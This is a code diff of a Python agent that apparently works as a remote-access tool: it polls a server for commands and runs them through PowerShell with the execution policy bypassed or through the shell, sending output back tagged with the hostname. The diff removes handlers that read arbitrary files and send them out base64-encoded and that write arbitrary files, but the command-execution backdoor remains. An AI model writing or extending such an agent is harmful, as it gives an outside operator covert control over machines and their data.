@@ -1,4 +1,3 @@
-import base64
 import requests
 import subprocess
 import time
@@ -29,54 +28,6 @@ def get_system_info():
     }
     return json.dumps(info)
 
-
-def execute_file_pull(command):
-    """Expected format: FILE_PULL_B64|<path_b64>"""
-    try:
-        _, path_b64 = command.split("|", 1)
-        file_path = base64.b64decode(path_b64.encode()).decode(errors='replace').strip()
-
-        with open(file_path, "rb") as f:
-            raw_bytes = f.read()
-
-        payload = base64.b64encode(raw_bytes).decode()
-        path_payload = base64.b64encode(file_path.encode()).decode()
-        return f"FILE_DATA_B64|{path_payload}|{payload}"
-    except Exception as e:
-        err = base64.b64encode(str(e).encode()).decode()
-        path = ""
-        try:
-            path = command.split("|", 1)[1]
-        except Exception:
-            path = ""
-        return f"FILE_ERROR_B64|{path}|{err}"
-
-
-def execute_file_push(command):
-    """Expected format: FILE_PUSH_B64|<path_b64>|<content_b64>"""
-    try:
-        _, path_b64, content_b64 = command.split("|", 2)
-        file_path = base64.b64decode(path_b64.encode()).decode(errors='replace').strip()
-        if (file_path.startswith("'") and file_path.endswith("'")) or (file_path.startswith('"') and file_path.endswith('"')):
-            file_path = file_path[1:-1]
-
-        raw_bytes = base64.b64decode(content_b64.encode())
-
-        with open(file_path, "wb") as f:
-            f.write(raw_bytes)
-
-        ok = base64.b64encode(f"WROTE:{len(raw_bytes)}".encode()).decode()
-        return f"FILE_WRITE_OK_B64|{path_b64}|{ok}"
-    except Exception as e:
-        err = base64.b64encode(str(e).encode()).decode()
-        path = ""
-        try:
-            path = command.split("|", 2)[1]
-        except Exception:
-            path = ""
-        return f"FILE_WRITE_ERROR_B64|{path}|{err}"
-
-
 def run_agent():
     my_hostname = platform.node()
     current_os = platform.system()
@@ -104,17 +55,12 @@ def run_agent():
                     if command and command.lower() != "none":
                         print(f"[*] Executing: {command[:120]}")
 
-                        if command.startswith("FILE_PULL_B64|"):
-                            raw_result = execute_file_pull(command)
-                        elif command.startswith("FILE_PUSH_B64|"):
-                            raw_result = execute_file_push(command)
+                        # Normal command execution
+                        if current_os == "Windows":
+                            full_cmd = ["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", command]
+                            raw_result = subprocess.check_output(full_cmd, stderr=subprocess.STDOUT, shell=True).decode(errors='replace')
                         else:
-                            # Normal command execution
-                            if current_os == "Windows":
-                                full_cmd = ["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", command]
-                                raw_result = subprocess.check_output(full_cmd, stderr=subprocess.STDOUT, shell=True).decode(errors='replace')
-                            else:
-                                raw_result = subprocess.getoutput(command)
+                            raw_result = subprocess.getoutput(command)
 
                         # 3. Format Result
                         formatted_result = f"{my_hostname}|{raw_result}"
